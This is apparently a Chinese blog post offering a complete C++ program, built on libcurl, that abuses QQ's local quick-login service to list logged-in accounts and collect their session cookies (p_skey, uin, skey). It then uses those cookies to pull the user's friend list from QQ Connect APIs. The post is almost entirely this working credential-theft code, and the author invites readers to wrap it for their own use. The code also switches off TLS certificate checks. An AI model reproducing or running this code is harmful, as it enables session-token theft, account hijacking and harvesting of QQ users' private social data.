---
title: 利用QQ快捷登陆盗取Token，好友，群信息
date: 2020-05-01 12:20:44
categories:
  - [c/c++, reverse-engineering]
  - [web-security]
---
直接放硬（硬编码，需要的自己封装）代码了

<!--more-->

原理可以看这篇文章

https://blog.csdn.net/qq3401247010/article/details/77867410


``` c++
#include <iostream>
#include <string>

#include <ctime>

#define _USE_MATH_DEFINES
#include <math.h>

#include <curl/curl.h>
#include <json/json.h>


size_t CurlWrite_CallbackFunc_StdString(void* contents, size_t size, size_t nmemb, std::string* s) {
	size_t newLength = size * nmemb;
	try {
		s->append((char*)contents, newLength);
	}
	catch (std::bad_alloc& e) {
		//handle memory problem
		return 0;
	}
	return newLength;
}

double get_random(int a,int b) {
	return (std::rand() % (99 - a + 1)) + a;
}



std::string UTF8ToGBEx(const char* utf8)
{
	if (!utf8 || strlen(utf8) < 1)
		return "";

	std::stringstream ss;
	int len = MultiByteToWideChar(CP_UTF8, 0, utf8, -1, NULL, 0);
	wchar_t* wstr = new wchar_t[len + 1];
	memset(wstr, 0, len + 1);
	MultiByteToWideChar(CP_UTF8, 0, utf8, -1, wstr, len);
	len = WideCharToMultiByte(CP_ACP, 0, wstr, -1, NULL, 0, NULL, NULL);
	char* str = new char[len + 1];
	memset(str, 0, len + 1);
	WideCharToMultiByte(CP_ACP, 0, wstr, -1, str, len, NULL, NULL);
	ss << str;
	delete[]wstr;
	delete[]str;
	return ss.str();
}

int main() {

	CURL* curl;
	CURLcode res;
	std::srand((unsigned int)std::time(nullptr));

	auto r = get_random(1, 99) / M_PI / 100;

	curl = curl_easy_init();
	std::string s;
	if (curl) {

		do {

			curl_easy_setopt(curl, CURLOPT_URL, "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?link_target=blank&pt_disable_pwd=1&appid=716027601&daid=377&target=self&style=11&s_url=https%3A//connect.qq.com/widget/shareqq/success.html");
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, CurlWrite_CallbackFunc_StdString);

			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); //only for https
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); //only for https
			curl_easy_setopt(curl, CURLOPT_HEADER, 1L);
			curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L); //remove this to disable verbose output
			curl_easy_setopt(curl, CURLOPT_COOKIEFILE, "/xxtemp/cookies.txt");
			curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "/xxtemp/cookies.txt");

			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36");
			curl_easy_setopt(curl, CURLOPT_REFERER, "https://connect.qq.com/widget/shareqq/index.html?url=https%3A%2F%2Fwww.bilibili.com");

			res = curl_easy_perform(curl);

			/* Check for errors */
			if (res != CURLE_OK)
			{
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
				break;
			}
			std::string t_cookie_name = "Set-Cookie: pt_local_token=";
			auto index = s.find(t_cookie_name);
			if (index == std::string::npos)
				break;
			auto pt_local_token = s.substr(index + t_cookie_name.length(), s.find(";", index) - index - t_cookie_name.length());
			std::string t_url = "https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&r=";
			t_url.append(std::to_string(r));
			t_url.append("&pt_local_tk=");
			t_url.append(pt_local_token);

			s.clear();
			curl_easy_setopt(curl, CURLOPT_URL, t_url.c_str());
			curl_easy_setopt(curl, CURLOPT_REFERER, "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?link_target=blank&pt_disable_pwd=1&appid=716027601&daid=377&target=self&style=11&s_url=https%3A//connect.qq.com/widget/shareqq/success.html");
			res = curl_easy_perform(curl);

			/* Check for errors */
			if (res != CURLE_OK)
			{
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
				break;
			}
			std::string t_var_sso_uin_list = "var_sso_uin_list=";
			auto var_sso_uin_list_index = s.find(t_var_sso_uin_list);
			if (var_sso_uin_list_index == std::string::npos)
				break;
			std::string var_sso_uin_list_s = s.substr(var_sso_uin_list_index + t_var_sso_uin_list.length(), s.find(";", var_sso_uin_list_index + t_var_sso_uin_list.length()) - var_sso_uin_list_index - t_var_sso_uin_list.length());
			Json::CharReaderBuilder builder;
			const std::unique_ptr<Json::CharReader> reader(builder.newCharReader());
			Json::Value root;
			JSONCPP_STRING err;
			if (!reader->parse(var_sso_uin_list_s.c_str(), var_sso_uin_list_s.c_str() + var_sso_uin_list_s.length(), &root,
				&err)) {
				std::cout << "error" << std::endl;
				break;
			}
			
			for (size_t i = 0; i < root.size(); i++) {
				std::cout << root[i]["account"].asString() << std::endl;

				t_url = "https://localhost.ptlogin2.qq.com:4301/pt_get_st?clientuin=";
				t_url.append(root[i]["account"].asString());
				t_url.append("&callback=ptui_getst_CB&r=");
				t_url.append(std::to_string(r));
				t_url.append("&pt_local_tk=");
				t_url.append(pt_local_token);

				s.clear();
				curl_easy_setopt(curl, CURLOPT_URL, t_url.c_str());
				curl_easy_setopt(curl, CURLOPT_REFERER, "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?link_target=blank&pt_disable_pwd=1&appid=716027601&daid=377&target=self&style=11&s_url=https%3A//connect.qq.com/widget/shareqq/success.html");
				res = curl_easy_perform(curl);

				/* Check for errors */
				if (res != CURLE_OK)
				{
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
						curl_easy_strerror(res));
					break;
				}

				t_url = "https://ssl.ptlogin2.qq.com/jump?clientuin=";
				t_url.append(root[i]["account"].asString());
				t_url.append("&pt_local_tk=");
				t_url.append(pt_local_token);
				t_url.append("&keyindex=9&pt_aid=716027601&daid=377&u1=https%3A%2F%2Fconnect.qq.com%2Fwidget%2Fshareqq%2Fsuccess.html&pt_3rd_aid=0&ptopt=1&style=40&has_onekey=1");

				s.clear();
				curl_easy_setopt(curl, CURLOPT_URL, t_url.c_str());
				curl_easy_setopt(curl, CURLOPT_REFERER, "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?link_target=blank&pt_disable_pwd=1&appid=716027601&daid=377&target=self&style=11&s_url=https%3A//connect.qq.com/widget/shareqq/success.html");
				res = curl_easy_perform(curl);

				/* Check for errors */
				if (res != CURLE_OK)
				{
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
						curl_easy_strerror(res));
					break;
				}

				std::string t_target_url = "ptui_qlogin_CB('0', '";
				auto target_url_index = s.find(t_target_url);
				if (target_url_index == std::string::npos)
					break;
				std::string target_url_s = s.substr(target_url_index + t_target_url.length(), s.find("'", target_url_index + t_target_url.length()) - target_url_index - t_target_url.length());
				
				s.clear();
				curl_easy_setopt(curl, CURLOPT_URL, target_url_s.c_str());
				curl_easy_setopt(curl, CURLOPT_REFERER, "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?link_target=blank&pt_disable_pwd=1&appid=716027601&daid=377&target=self&style=11&s_url=https%3A//connect.qq.com/widget/shareqq/success.html");
				res = curl_easy_perform(curl);

				/* Check for errors */
				if (res != CURLE_OK)
				{
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
						curl_easy_strerror(res));
					break;
				}

				//获取p_skey uin skey
				std::string p_skey_name = "Set-Cookie: p_skey=";
				auto p_skey_index = s.find(p_skey_name);
				if (p_skey_index == std::string::npos)
					break;
				std::string p_skey = s.substr(p_skey_index + p_skey_name.length(), s.find(";", p_skey_index + p_skey_name.length()) - p_skey_index - p_skey_name.length());

				std::string uin_name = "Set-Cookie: uin=";
				auto uin_index = s.find(uin_name);
				if (uin_index == std::string::npos)
					break;
				std::string uin = s.substr(uin_index + uin_name.length(), s.find(";", uin_index + uin_name.length()) - uin_index - uin_name.length());
				
				std::string skey_name = "Set-Cookie: skey=";
				auto skey_index = s.find(skey_name);
				if (skey_index == std::string::npos)
					break;
				std::string skey = s.substr(skey_index + skey_name.length(), s.find(";", skey_index + skey_name.length()) - skey_index - skey_name.length());

				s.clear();
				curl_easy_setopt(curl, CURLOPT_URL, "https://cgi.connect.qq.com/proxy.html?t=20120217001&callback=1&id=1");
				curl_easy_setopt(curl, CURLOPT_REFERER, "https://connect.qq.com/widget/shareqq/index.html?url=https%3A%2F%2Fwww.bilibili.com");
				std::string cookies = "p_skey=";
				cookies.append(p_skey);
				cookies.append("; uin=");
				cookies.append(uin);
				cookies.append("; skey=");
				cookies.append(skey);
				cookies.append(";");
				curl_easy_setopt(curl, CURLOPT_COOKIE, cookies.c_str());
				::Sleep(3000);//后面这里太快，调用接口会404，官方自己也有这个问题
				res = curl_easy_perform(curl);

				/* Check for errors */
				if (res != CURLE_OK)
				{
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
						curl_easy_strerror(res));
					break;
				}
				std::string is_first = "https://cgi.connect.qq.com/qqconnectopen/is_first?t=";
				is_first.append(std::to_string(std::time(nullptr)));

				s.clear();
				curl_easy_setopt(curl, CURLOPT_URL, is_first.c_str());
				curl_easy_setopt(curl, CURLOPT_REFERER, "https://cgi.connect.qq.com/proxy.html?t=20120217001&callback=1&id=1");
				::Sleep(3000);
				res = curl_easy_perform(curl);

				/* Check for errors */
				if (res != CURLE_OK)
				{
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
						curl_easy_strerror(res));
					break;
				}
				
				std::string get_user_friends = "https://cgi.connect.qq.com/qqconnectopen/openapi/get_user_friends?t=";
				get_user_friends.append(std::to_string(std::time(nullptr)));

				s.clear();
				curl_easy_setopt(curl, CURLOPT_URL, get_user_friends.c_str());
				curl_easy_setopt(curl, CURLOPT_REFERER, "https://cgi.connect.qq.com/proxy.html?t=20120217001&callback=1&id=1");
				curl_easy_setopt(curl, CURLOPT_COOKIE, cookies.c_str());
				::Sleep(3000);
				res = curl_easy_perform(curl);

				/* Check for errors */
				if (res != CURLE_OK)
				{
					fprintf(stderr, "curl_easy_perform() failed: %s\n",
						curl_easy_strerror(res));
					break;
				}
				s = UTF8ToGBEx(s.c_str());
				std::cout << s << std::endl;

			}


		} while (false);

		/* always cleanup */
		curl_easy_cleanup(curl);
	}

	std::cout << "Program finished!" << std::endl;

	return 0;
}
```